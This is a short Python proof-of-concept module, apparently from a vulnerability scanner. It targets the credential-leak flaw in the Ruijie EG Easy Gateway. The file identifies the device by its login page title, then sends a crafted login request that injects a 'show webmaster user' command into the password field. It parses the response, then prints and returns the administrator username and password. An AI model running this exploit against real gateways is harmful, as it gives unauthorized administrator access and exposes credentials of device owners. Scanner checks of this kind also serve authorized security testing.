# -*- coding:utf-8 -*-
# 锐捷EG易网关 管理员账号密码泄露

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def get_admin_pwd(self, url):
        resp = self.requestUtil.post(f"{url}/login.php",
                                data="username=admin&password=admin?show+webmaster+user").json()
        if "00." in resp["data"]:
            users = (resp["data"].encode().split(b"\r\r\n")[2:])
            admin_info = (b"[psw]".join(users[0].split(b" ")[1:])).decode()
            return (b"<br>".join(users).decode(), admin_info)

    def fingerprint(self):
        try:
            service = self.service
            if service.title == "锐捷网络--登录页面":
                return True
            if service.url and service.title == "空标题":
                resp = self.requestUtil.get(service.url)
                if "锐捷网络--登录页面" in resp.content.decode():
                    service.title = "锐捷网络--登录页面"
                    service.save()
                    return True
        except:
            return False

    def poc(self):
        try:
            result = self.get_admin_pwd(self.service.url)
            if result:
                print(result[1])
                return (["锐捷EG易网关 管理员账号密码泄露", "系统用户:<br> %s" % result[0]], result[1])
        except:
            return []
